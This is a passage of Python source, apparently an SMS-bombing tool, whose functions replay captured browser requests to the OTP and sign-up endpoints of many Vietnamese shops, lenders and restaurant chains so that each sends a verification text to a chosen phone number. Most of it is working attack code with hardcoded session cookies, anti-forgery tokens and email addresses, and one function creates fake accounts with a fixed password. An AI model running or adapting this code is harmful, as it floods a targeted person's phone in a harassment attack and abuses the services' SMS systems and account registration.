        '_ga_5MXNSQHGT3': 'GS1.2.1696863756.4.1.1696863760.56.0.0',
        'SvID': 'dmxcart243|ZSQWE|ZSQWC',
    }

    headers = {
        'authority': 'www.dienmayxanh.com',
        'accept': '*/*',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': 'DMX_View=DESKTOP; DMX_Personal=%7b%22UID%22%3a%222e85670b4f888d4c99dbd2360bc90ce380ef3be6%22%2c%22ProvinceId%22%3a3%2c%22Culture%22%3a%22vi-3%22%2c%22Lat%22%3a0.0%2c%22Lng%22%3a0.0%2c%22DistrictId%22%3a0%2c%22WardId%22%3a0%2c%22CRMCustomerId%22%3anull%2c%22CustomerSex%22%3a-1%2c%22CustomerName%22%3anull%2c%22CustomerPhone%22%3anull%2c%22CustomerEmail%22%3anull%2c%22CustomerIdentity%22%3anull%2c%22CustomerBirthday%22%3anull%2c%22CustomerAddress%22%3anull%2c%22IsDefault%22%3atrue%7d; _gcl_au=1.1.253766059.1695302529; _fbp=fb.1.1695302529320.2091173293; _pk_id.8.8977=b761a85b1c4ec708.1695302530.; lhc_per=vid|c5415ae10a5aa92849c8; _utm_thegioididong=ad8ce83b-f263-4830-b439-e21772306183; _gid=GA1.2.1954391721.1696863755; _gat_UA-38936689-1=1; _pk_ref.8.8977=%5B%22%22%2C%22%22%2C1696863755%2C%22https%3A%2F%2Fwww.google.com%2F%22%5D; _pk_ses.8.8977=1; cebs=1; _ce.s=v~b5f384abc977844302b06e0fe60fd00f4f1fe0c4~lcw~1696767519844~vpv~3~v11.fhb~1696740465158~v11.lhb~1696740465159~gtrk.la~lnhfkler~lcw~1696863759182; .AspNetCore.Antiforgery.UMd7_MFqVbs=CfDJ8ImUV2tmepFDqJx13sccnB46MPBobaACSBj7eshF_9SCebN3S7stxk2YXcBeLtItXkhdRYJoesT9IqKJ2ZQjWPChRnERC7-a87atovBdMTC1VozbOncUllBu79jlyN9dNLiYqAUGwlUEo4sZZeqUmq0; _ga_Y7SWKJEHCE=GS1.1.1696863755.4.1.1696863759.56.0.0; _ga=GA1.1.1835783839.1695302529; _ga_5MXNSQHGT3=GS1.2.1696863756.4.1.1696863760.56.0.0; SvID=dmxcart243|ZSQWE|ZSQWC',
        'origin': 'https://www.dienmayxanh.com',
        'referer': 'https://www.dienmayxanh.com/lich-su-mua-hang/dang-nhap',
        'sec-ch-ua': '"Google Chrome";v="117", "Not;A=Brand";v="8", "Chromium";v="117"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'phoneNumber': phone,
        'isReSend': 'false',
        'sendOTPType': '1',
        '__RequestVerificationToken': 'CfDJ8ImUV2tmepFDqJx13sccnB4o11KCYw1u2AF2MzkK5lHqa_Q18phXQQdES5cGsmDjG4i8f6yaLEvcgq_jv81YxxvVtEIcAsG7vYF65vo8gYMGX4Zt-ndLGEzNJeXwXqmeZ1IiJwsYXPBBD63UnUT2UbY',
    }

    response = requests.post(
        'https://www.dienmayxanh.com/lich-su-mua-hang/LoginV2/GetVerifyCode',
        cookies=cookies,
        headers=headers,
        data=data,
    )   
#
def tgdt(sdt):
    cookies = {
        '_pk_id.7.8f7e': 'fafcd5aeefc6aa83.1695100015.',
        '_fbp': 'fb.1.1695100023006.1516465159',
        '_tt_enable_cookie': '1',
        '_ttp': '2dVeiJnbN1Gsidc1gtcVY_SGIVX',
        'lhc_per': 'vid|5e413d644a9df00476b3',
        'DMX_Personal': '%7B%22UID%22%3A%2215e71012a44897ba100b1ef74e934087d901d2ed%22%2C%22ProvinceId%22%3A3%2C%22Address%22%3Anull%2C%22Culture%22%3A%22vi-3%22%2C%22Lat%22%3A0.0%2C%22Lng%22%3A0.0%2C%22DistrictId%22%3A0%2C%22WardId%22%3A0%2C%22StoreId%22%3A0%2C%22CouponCode%22%3Anull%2C%22CRMCustomerId%22%3Anull%2C%22CustomerSex%22%3A-1%2C%22CustomerName%22%3Anull%2C%22CustomerPhone%22%3Anull%2C%22CustomerEmail%22%3Anull%2C%22CustomerIdentity%22%3Anull%2C%22CustomerBirthday%22%3Anull%2C%22CustomerAddress%22%3Anull%2C%22IsDefault%22%3Afalse%2C%22IsFirst%22%3Afalse%7D',
        '_gid': 'GA1.2.1475447331.1696861207',
        'cebs': '1',
        '_ce.clock_event': '1',
        '_ce.clock_data': '1073%2C116.101.195.150%2C1%2C22210ca73bf1af2ec2eace74a96ee356',
        '_ce.s': 'v~308b88860b9e7a6fa67cf506e8e62f16db855262~lcw~1696861214041~vpv~4~v11.fhb~1696861214040~v11.lhb~1696861214042~lcw~1696861214043',
        '.AspNetCore.Antiforgery.UMd7_MFqVbs': 'CfDJ8ImUV2tmepFDqJx13sccnB5KWfeX_UeI2Bj2DM1XQSJjHeDtoGCtbQ7wwLfjMzkoIRumRq3ruPvrLJLlfA_ob_V6fiv-LndsCfjTUIF-3Nlz0rM92OhkcdxyoOUWvU3RoF83x2lzO8SKDeC7BTMxafw',
        'MWG_ORDERHISTORY_SS': 'CfDJ8ImUV2tmepFDqJx13sccnB7k%2BVNak%2BS6NtzlpOFerQZhTYHMdzgzBu8FWfhkmGFzMUJHvUyOwoGSOKHESRm9cJZx8DJS3fDEv5DYsvSNxrFzrykqY56CkOXZNNodMlvkX7z27bHd%2FHQoLEcDQj0yW%2B7VrMw8qgkHyiEBOjtRxulR',
        '_gat_UA-918185-25': '1',
        '_pk_ref.7.8f7e': '%5B%22%22%2C%22%22%2C1696863848%2C%22https%3A%2F%2Fwww.google.com%2F%22%5D',
        '_pk_ses.7.8f7e': '1',
        '_gat': '1',
        'SvID': 'tgcart2736|ZSQWa|ZSQMF',
        '_ga_TLRZMSX5ME': 'GS1.1.1696863847.6.1.1696863849.58.0.0',
        '_ga': 'GA1.1.228298484.1695100015',
        '_ga_TZK5WPYMMS': 'GS1.2.1696863847.6.1.1696863849.58.0.0',
        'cebsp_': '3',
    }

    headers = {
        'authority': 'www.thegioididong.com',
        'accept': '*/*',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': '_pk_id.7.8f7e=fafcd5aeefc6aa83.1695100015.; _fbp=fb.1.1695100023006.1516465159; _tt_enable_cookie=1; _ttp=2dVeiJnbN1Gsidc1gtcVY_SGIVX; lhc_per=vid|5e413d644a9df00476b3; DMX_Personal=%7B%22UID%22%3A%2215e71012a44897ba100b1ef74e934087d901d2ed%22%2C%22ProvinceId%22%3A3%2C%22Address%22%3Anull%2C%22Culture%22%3A%22vi-3%22%2C%22Lat%22%3A0.0%2C%22Lng%22%3A0.0%2C%22DistrictId%22%3A0%2C%22WardId%22%3A0%2C%22StoreId%22%3A0%2C%22CouponCode%22%3Anull%2C%22CRMCustomerId%22%3Anull%2C%22CustomerSex%22%3A-1%2C%22CustomerName%22%3Anull%2C%22CustomerPhone%22%3Anull%2C%22CustomerEmail%22%3Anull%2C%22CustomerIdentity%22%3Anull%2C%22CustomerBirthday%22%3Anull%2C%22CustomerAddress%22%3Anull%2C%22IsDefault%22%3Afalse%2C%22IsFirst%22%3Afalse%7D; _gid=GA1.2.1475447331.1696861207; cebs=1; _ce.clock_event=1; _ce.clock_data=1073%2C116.101.195.150%2C1%2C22210ca73bf1af2ec2eace74a96ee356; _ce.s=v~308b88860b9e7a6fa67cf506e8e62f16db855262~lcw~1696861214041~vpv~4~v11.fhb~1696861214040~v11.lhb~1696861214042~lcw~1696861214043; .AspNetCore.Antiforgery.UMd7_MFqVbs=CfDJ8ImUV2tmepFDqJx13sccnB5KWfeX_UeI2Bj2DM1XQSJjHeDtoGCtbQ7wwLfjMzkoIRumRq3ruPvrLJLlfA_ob_V6fiv-LndsCfjTUIF-3Nlz0rM92OhkcdxyoOUWvU3RoF83x2lzO8SKDeC7BTMxafw; MWG_ORDERHISTORY_SS=CfDJ8ImUV2tmepFDqJx13sccnB7k%2BVNak%2BS6NtzlpOFerQZhTYHMdzgzBu8FWfhkmGFzMUJHvUyOwoGSOKHESRm9cJZx8DJS3fDEv5DYsvSNxrFzrykqY56CkOXZNNodMlvkX7z27bHd%2FHQoLEcDQj0yW%2B7VrMw8qgkHyiEBOjtRxulR; _gat_UA-918185-25=1; _pk_ref.7.8f7e=%5B%22%22%2C%22%22%2C1696863848%2C%22https%3A%2F%2Fwww.google.com%2F%22%5D; _pk_ses.7.8f7e=1; _gat=1; SvID=tgcart2736|ZSQWa|ZSQMF; _ga_TLRZMSX5ME=GS1.1.1696863847.6.1.1696863849.58.0.0; _ga=GA1.1.228298484.1695100015; _ga_TZK5WPYMMS=GS1.2.1696863847.6.1.1696863849.58.0.0; cebsp_=3',
        'origin': 'https://www.thegioididong.com',
        'referer': 'https://www.thegioididong.com/lich-su-mua-hang/dang-nhap',
        'sec-ch-ua': '"Google Chrome";v="117", "Not;A=Brand";v="8", "Chromium";v="117"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'phoneNumber': phone,
        'isReSend': 'false',
        'sendOTPType': '1',
        '__RequestVerificationToken': 'CfDJ8ImUV2tmepFDqJx13sccnB5YUu5lRjXkoETwwzZTcDPI_urb9AHhANd7AT2YEGtuSkxJVnHYNZ8x8MuFiuilvVNSaFlB_nrnygjK6Ye9yaEW2U8P1iD2P1ezFOL4D-mdOA4ERuYJO1vlObXc-Siw9KM',
    }

    response = requests.post(
        'https://www.thegioididong.com/lich-su-mua-hang/LoginV2/GetVerifyCode',
        cookies=cookies,
        headers=headers,
        data=data,
    ) 
#
def concung(sdt):
    cookies = {
        '6f1eb01ca7fb61e4f6882c1dc816f22d': 'T%2FEqzjRRd5g%3DKvAFbz7EcUE%3Dsd1gG6SktiU%3D6rJZ9YHvMZQ%3DH9DwywDLCIw%3Da7NDiPDjkp8%3DBMNH2%2FPz1Ww%3DjFPr4PEbB58%3DD94ivb5Cw3c%3Dr1OchLBIGPo%3DXm3ctRf7oxM%3D9alt4piEgqQ%3DQ7x721%2FEaGg%3DuZW0GQvziBc%3DUbvFQmA3C5E%3DdJFYAKivttQ%3D',
        '__utmz': '65249340.1696740688.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)',
        '_tt_enable_cookie': '1',
        '_ttp': '1Tmc7m9S_sD1QBN3IIX3ri-oZb3',
        '__admUTMtime': '1696740688',
        '_gcl_au': '1.1.1625966708.1696740689',
        '_ga': 'GA1.1.1726287706.1696740690',
        'dtdz': '91434063-89c5-4554-915f-bad24df58eab',
        '_fbp': 'fb.1.1696740689899.485851205',
        '__RC': '9',
        '__R': '1',
        '__iid': '',
        '__iid': '',
        '__su': '0',
        '__su': '0',
        '__tb': '0',
        '__IP': '1952826262',
        'PHPSESSID': 'q9llk9nls4uj1fjto2o1661klj',
        '__utma': '65249340.738370805.1696740688.1696740688.1696863961.2',
        '__utmc': '65249340',
        '__utmt': '1',
        '__utmb': '65249340.2.10.1696863961',
        '_ga_DFG3FWNPBM': 'GS1.1.1696863960.2.1.1696863970.50.0.0',
        '_ga_BBD6001M29': 'GS1.1.1696863961.2.1.1696863970.51.0.0',
        '__uif': '__uid%3A6551281632885571587%7C__ui%3A-1%7C__create%3A1695128163',
        'Srv': 'cc204|ZSQW+|ZSQW1',
    }

    headers = {
        'authority': 'concung.com',
        'accept': '*/*',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': '6f1eb01ca7fb61e4f6882c1dc816f22d=T%2FEqzjRRd5g%3DKvAFbz7EcUE%3Dsd1gG6SktiU%3D6rJZ9YHvMZQ%3DH9DwywDLCIw%3Da7NDiPDjkp8%3DBMNH2%2FPz1Ww%3DjFPr4PEbB58%3DD94ivb5Cw3c%3Dr1OchLBIGPo%3DXm3ctRf7oxM%3D9alt4piEgqQ%3DQ7x721%2FEaGg%3DuZW0GQvziBc%3DUbvFQmA3C5E%3DdJFYAKivttQ%3D; __utmz=65249340.1696740688.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); _tt_enable_cookie=1; _ttp=1Tmc7m9S_sD1QBN3IIX3ri-oZb3; __admUTMtime=1696740688; _gcl_au=1.1.1625966708.1696740689; _ga=GA1.1.1726287706.1696740690; dtdz=91434063-89c5-4554-915f-bad24df58eab; _fbp=fb.1.1696740689899.485851205; __RC=9; __R=1; __iid=; __iid=; __su=0; __su=0; __tb=0; __IP=1952826262; PHPSESSID=q9llk9nls4uj1fjto2o1661klj; __utma=65249340.738370805.1696740688.1696740688.1696863961.2; __utmc=65249340; __utmt=1; __utmb=65249340.2.10.1696863961; _ga_DFG3FWNPBM=GS1.1.1696863960.2.1.1696863970.50.0.0; _ga_BBD6001M29=GS1.1.1696863961.2.1.1696863970.51.0.0; __uif=__uid%3A6551281632885571587%7C__ui%3A-1%7C__create%3A1695128163; Srv=cc204|ZSQW+|ZSQW1',
        'origin': 'https://concung.com',
        'referer': 'https://concung.com/dang-nhap.html',
        'sec-ch-ua': '"Google Chrome";v="117", "Not;A=Brand";v="8", "Chromium";v="117"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'ajax': '1',
        'classAjax': 'AjaxLogin',
        'methodAjax': 'sendOtpLogin',
        'customer_phone': phone,
        'statictoken': 'e633865a31fa27f35b8499e1a75b0a76',
        'id_customer': '0',
    }

    response = requests.post('https://concung.com/ajax.html?sendOtpLogin', cookies=cookies, headers=headers, data=data)
#
def mocha(sdt):
    headers = {
    'Accept-Language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'Connection': 'keep-alive',
    'Origin': 'https://www.best-inc.vn',
    'Referer': 'https://www.best-inc.vn/',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'cross-site',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
    'accept': 'application/json',
    'authorization': 'null',
    'content-type': 'application/json',
    'lang-type': 'vi-VN',
    'sec-ch-ua': '"Not/A)Brand";v="99", "Google Chrome";v="115", "Chromium";v="115"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'x-auth-type': 'WEB',
    'x-lan': 'VI',
    'x-nat': 'vi-VN',
    'x-timezone-offset': '7',
}

    json_data = {
    'phoneNumber': phone,
    'verificationCodeType': 1,
}

    response = requests.post('https://v9-cc.800best.com/uc/account/sendsignupcode', headers=headers, json=json_data)

def money(sdt):
    cookies = {
    'CaptchaCookieKey': '0',
    'language': 'vi',
    'UserTypeMarketing': 'L0',
    '__sbref': 'aoenyfhotuysrfcdmgodoankpbvodkhlvlscieux',
    'ASP.NET_SessionId': 'k1lr5wm2mja2oyaf1zkcrdtu',
    'RequestData': '85580b70-8a3a-4ebc-9746-1009df921f42',
    '_gid': 'GA1.2.2031038846.1691083804',
    'UserMachineId_png': 'fd5259b0-62a7-41c7-b5c5-e4ff646af322',
    'UserMachineId_etag': 'fd5259b0-62a7-41c7-b5c5-e4ff646af322',
    'UserMachineId_cache': 'fd5259b0-62a7-41c7-b5c5-e4ff646af322',
    'UserMachineId': 'fd5259b0-62a7-41c7-b5c5-e4ff646af322',
    '__RequestVerificationToken': 'G2H_TJyUnD4H65Lm_j7S2Ht0dUpNMG144oOeimKpubcF34pquENoVtqqNwOM8Fkgjr3O9HKJj0DqvT_erkcGDKu2KVDRDsu1fgTA2SmkTE41',
    '_ga_LCPCW0ZYR8': 'GS1.1.1691083803.8.1.1691084292.44.0.0',
    '_ga': 'GA1.2.149632214.1689613025',
    'Marker': 'MarkerInfo=okk9LDILW/aZ/w6AkrhdpD21+MPg0L0hAEKWJo2NX18=',
}

    headers = {
    'authority': 'moneyveo.vn',
    'accept': '*/*',
    'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'cookie': 'CaptchaCookieKey=0; language=vi; UserTypeMarketing=L0; __sbref=aoenyfhotuysrfcdmgodoankpbvodkhlvlscieux; ASP.NET_SessionId=k1lr5wm2mja2oyaf1zkcrdtu; RequestData=85580b70-8a3a-4ebc-9746-1009df921f42; _gid=GA1.2.2031038846.1691083804; UserMachineId_png=fd5259b0-62a7-41c7-b5c5-e4ff646af322; UserMachineId_etag=fd5259b0-62a7-41c7-b5c5-e4ff646af322; UserMachineId_cache=fd5259b0-62a7-41c7-b5c5-e4ff646af322; UserMachineId=fd5259b0-62a7-41c7-b5c5-e4ff646af322; __RequestVerificationToken=G2H_TJyUnD4H65Lm_j7S2Ht0dUpNMG144oOeimKpubcF34pquENoVtqqNwOM8Fkgjr3O9HKJj0DqvT_erkcGDKu2KVDRDsu1fgTA2SmkTE41; _ga_LCPCW0ZYR8=GS1.1.1691083803.8.1.1691084292.44.0.0; _ga=GA1.2.149632214.1689613025; Marker=MarkerInfo=okk9LDILW/aZ/w6AkrhdpD21+MPg0L0hAEKWJo2NX18=',
    'origin': 'https://moneyveo.vn',
    'referer': 'https://moneyveo.vn/vi/registernew/',
    'sec-ch-ua': '"Not/A)Brand";v="99", "Google Chrome";v="115", "Chromium";v="115"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'traceparent': '00-d26637ca1a2ab6f01520174ccd97bf37-9060d6bf9370d383-00',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
}

    data = {
    'phoneNumber': phone,
}

    response = requests.post('https://moneyveo.vn/vi/registernew/sendsmsjson/', cookies=cookies, headers=headers, data=data)

def winmart(sdt):
  head = {
    "Host":"api-crownx.winmart.vn",
    "accept":"application/json",
    "authorization":"Bearer undefined",
    "user-agent":"Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36",
    "x-requested-with":"mark.via.gp",
    "sec-fetch-site":"same-site",
    "sec-fetch-mode":"cors",
    "sec-fetch-dest":"empty",
    "referer":"https://winmart.vn/",
    "accept-encoding":"gzip, deflate, br",
    "accept-language":"vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7",
  }
  rq = requests.get(f"https://api-crownx.winmart.vn/as/api/web/v1/send-otp?phoneNo={phone}",headers=head).json()

        ###
def pop(sdt):
  data= '{"phone":"phone","firstName":"Nguyen","lastName":"Hoang","email":"Khgf123@gmail.com","password":"1262007gdtg"}'
  data = data.replace("phone",phone)
  head = {
    "Host":"api.popeyes.vn",
    "accept":"application/json",
    "x-client":"WebApp",
    "user-agent":"Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36",
    "content-type":"application/json",
    "x-requested-with":"mark.via.gp",
    "sec-fetch-site":"same-site",
    "sec-fetch-mode":"cors",
    "sec-fetch-dest":"empty",
    "referer":"https://popeyes.vn/",
    "accept-encoding":"gzip, deflate, br",
  }
  rq = requests.post("https://api.popeyes.vn/api/v1/register",data=data, headers=head).json()

        ###
def tamo(sdt):
  data = '{"mobilePhone":{"number":"phone"}}'.replace("phone",phone)
  head = {
    "Host":"api.tamo.vn",
    "accept":"application/json, text/plain, */*",
    "user-agent":"Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36",
    "content-type":"application/json;charset=UTF-8",
    "origin":"https://www.tamo.vn",
    "x-requested-with":"mark.via.gp",
    "sec-fetch-site":"same-site",
    "sec-fetch-mode":"cors",
    "sec-fetch-dest":"empty",
    "referer":"https://www.tamo.vn/",
    "accept-encoding":"gzip, deflate, br",
    "accept-language":"vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7",
  }
  rq = requests.post("https://api.tamo.vn/web/public/client/phone/sms-code-ts",data=data,headers=head).json()

        ###
def alf(sdt):
    headers = {
    'authority': 'api.alfrescos.com.vn',
    'accept': 'application/json, text/plain, */*',
    'accept-language': 'vi-VN',
    'brandcode': 'ALFRESCOS',
    'cache-control': 'no-cache',
    'content-type': 'application/json',
    'devicecode': 'web',
    'origin': 'https://alfrescos.com.vn',
    'pragma': 'no-cache',
    'referer': 'https://alfrescos.com.vn/',
    'sec-ch-ua': '"Not/A)Brand";v="99", "Google Chrome";v="115", "Chromium";v="115"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
}

    params = {
    'culture': 'vi-VN',
}

    json_data = {
    'phoneNumber': phone,
    'secureHash': 'ebe2ae8a21608e1afa1dbb84e944dc89',
    'deviceId': '',
    'sendTime': 1691127801586,
    'type': 1,
}

    response = requests.post('https://api.alfrescos.com.vn/api/v1/User/SendSms', params=params, headers=headers, json=json_data)

def one(sdt):
    cookies = {
    'OnCredit_id': '64c6adf3d809f7.01651397',
    'GN_USER_ID_KEY': '0193298a-4d52-4ac4-9ae0-122db6db6511',
    '_fbp': 'fb.1.1690742262527.271328962',
    'fp_token_7c6a6574-f011-4c9a-abdd-9894a102ccef': 'alPojwPZVXiWPE18CbRzCK44S9WQ/FMYyFaayjOBdY4=',
    'SN5c8116d5e6183': 'q5oggojqh007le4fbecndo7544',
    '_ga_462Z3ZX24C': 'GS1.1.1691132245.5.1.1691132245.60.0.0',
    '_ga': 'GA1.2.1734785881.1690742262',
    '_gid': 'GA1.2.212173961.1691132246',
    '_gat_UA-139625802-1': '1',
    '_ga_4RZFMB042P': 'GS1.2.1691132246.4.0.1691132246.60.0.0',
    'GN_SESSION_ID_KEY': 'be3f87ed-3c12-43c3-be66-4c504d36691a',
}

    headers = {
    'authority': 'oncredit.vn',
    'accept': 'application/json, text/javascript, */*; q=0.01',
    'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'cache-control': 'no-cache',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'cookie': 'OnCredit_id=64c6adf3d809f7.01651397; GN_USER_ID_KEY=0193298a-4d52-4ac4-9ae0-122db6db6511; _fbp=fb.1.1690742262527.271328962; fp_token_7c6a6574-f011-4c9a-abdd-9894a102ccef=alPojwPZVXiWPE18CbRzCK44S9WQ/FMYyFaayjOBdY4=; SN5c8116d5e6183=q5oggojqh007le4fbecndo7544; _ga_462Z3ZX24C=GS1.1.1691132245.5.1.1691132245.60.0.0; _ga=GA1.2.1734785881.1690742262; _gid=GA1.2.212173961.1691132246; _gat_UA-139625802-1=1; _ga_4RZFMB042P=GS1.2.1691132246.4.0.1691132246.60.0.0; GN_SESSION_ID_KEY=be3f87ed-3c12-43c3-be66-4c504d36691a',
    'origin': 'https://oncredit.vn',
    'pragma': 'no-cache',
    'referer': 'https://oncredit.vn/registration',
    'sec-ch-ua': '"Not/A)Brand";v="99", "Google Chrome";v="115", "Chromium";v="115"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
}

    data = {
    'data[typeData]': 'sendCodeReg',
    'data[phone]': phone,
    'data[email]': 'tronkhai618@gmail.com',
    'data[captcha1]': '1',
    'data[lang]': 'vi',
    'CSRFName': 'CSRFGuard_ajax',
    'CSRFToken': 'TG8DEtT7GS8nA25DD88HszYeHeFFH4iSDtKkY8sniB5DFAH36BFbd3RyK3en9B46',
}

    response = requests.post('https://oncredit.vn/?ajax', cookies=cookies, headers=headers, data=data)

        ###
def piza(sdt):
    cookies = {
    'cdp_customerIdentify': '1',
    '_atm_objs': 'eyJzb3VyY2UiOiJnb29nbGUiLCJtZWRpdW0iOiJjcGMiLCJjYW1wYWlnbiI6ImFkd29yZHMiLCJj%0D%0Ab250ZW50IjoiYWR3b3JkcyIsInRlcm0iOiJhZHdvcmRzIiwidHlwZSI6ImFzc29jaWF0ZV91dG0i%0D%0ALCJjaGVja3N1bSI6IioiLCJ0aW1lIjoxNjkxMTMyOTkxOTI1fQ%3D%3D',
    '_pk_ref.564990546.fc16': '%5B%22%22%2C%22%22%2C1691132992%2C%22https%3A%2F%2Fwww.google.com%2F%22%5D',
    '_pk_ses.564990546.fc16': '*',
    '_gcl_au': '1.1.750634817.1691132992',
    'mage-cache-storage': '%7B%7D',
    'mage-cache-storage-section-invalidation': '%7B%7D',
    '_gcl_aw': 'GCL.1691132997.CjwKCAjww7KmBhAyEiwA5-PUSs-mCDku8Sxt0B5X_-yhmAOnL6cUXPEwZJkOzTTVT-WicOl_DV9YiRoC3-sQAvD_BwE',
    'form_key': 'BaxX2D1YXnWpW3Jp',
    '_ac_au_gt': '1691132993384',
    '_ga': 'GA1.1.1612590689.1691132998',
    '_fbp': 'fb.1.1691132998475.1386127342',
    '_asm_uid': '1200155066',
    'cdp_session': '1',
    'cdp_blocked_sid_1207269': '1',
    'recently_viewed_product': '%7B%7D',
    'recently_viewed_product_previous': '%7B%7D',
    'recently_compared_product': '%7B%7D',
    'recently_compared_product_previous': '%7B%7D',
    'product_data_storage': '%7B%7D',
    'mage-messages': '',
    'PHPSESSID': 'gj8tho2itg02igcokprgmcjuf4',
    'form_key': 'BaxX2D1YXnWpW3Jp',
    '_tt_enable_cookie': '1',
    '_ttp': 'h1r1vnub7F72iOjwOvqUYxSNAyc',
    '_ac_client_id': '1200147765.1691133070',
    'au_id': '1200147765',
    'private_content_version': '2fa7f4ae56c1c82407ce8b8a65c64a5a',
    '_asm_visitor_type': 'r',
    'mage-cache-sessid': 'true',
    '_cdp_cfg': '1',
    'cdp_blocked_sid_5056307': 'true',
    '_utm_objs': '',
    '_pk_id.564990546.fc16': '1200147765.1691132992.1.1691133481.1691132992.',
    '_ac_an_session': 'zhzqzgzgzmzgzlzmzhzhzdzjzdzizlzqzizizgzgznzrzhzdzizdzizlzqzizizgzgznzrzhzdzizlzqzizizgzgznzrzhzdzizdzhznzdzhzd2f27zdzgzdzezizd',
    '_ga_T93VCQ3ZQS': 'GS1.1.1691132998.1.1.1691133485.25.0.0',
    'cto_bundle': 'AEYB1l9hMjZ2c3JEcU9hVlI2c0FGUTBkeVV6ZXRUUEJKNjhwOVdqenR6Z0FuYnB1WW1LOTQ4ZHBZOEViRUJ0Q2dzajN2b3lRMDRYbjB5VTVoSEwlMkJnWjFqY05Ualg0WnpGMkpqY2dNWXNGcmMlMkI3eHh2MmthNnY2UXY1VndkeVpIVFY2c1BldDRnOFdkQUk3ZzMlMkJRQlpHVXBYYXclM0QlM0Q',
    'section_data_ids': '%7B%22customer%22%3A1691133495%2C%22cart%22%3A1691133495%2C%22shipping_address_selected%22%3A1691133495%2C%22compare-products%22%3A1691133495%2C%22last-ordered-items%22%3A1691133495%2C%22directory-data%22%3A1691133495%2C%22captcha%22%3A1691133495%2C%22instant-purchase%22%3A1691133495%2C%22persistent%22%3A1691133495%2C%22review%22%3A1691133495%2C%22wishlist%22%3A1691133495%2C%22faq%22%3A1691133495%2C%22ammessages%22%3A1691133495%2C%22rewards%22%3A1691133495%2C%22ins%22%3A1691133495%2C%22custom_address_local_storage_data%22%3A1691133495%2C%22recently_viewed_product%22%3A1691133495%2C%22recently_compared_product%22%3A1691133495%2C%22product_data_storage%22%3A1691133495%2C%22paypal-billing-agreement%22%3A1691133495%7D',
}

    headers = {
    'authority': 'www.kidsplaza.vn',
    'accept': '*/*',
